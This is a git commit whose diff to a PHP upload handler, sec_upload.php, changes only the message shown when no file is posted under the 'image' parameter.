4451e804264c17695f5b518a3831451328361558
maximo896 <della.maximo896@anglernook.com>
2026-02-27 15:03:03 +0800

    Add files via upload

--- sec_upload.php
+++ sec_upload.php
@@ -153,6 +153,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
     file_put_contents($final_name, $content);
     echo "File decoded successfully: $final_name";
 } else {
-    echo "Please upload image";
+    echo "Please upload file using POST with 'image' parameter";
 }
 ?>
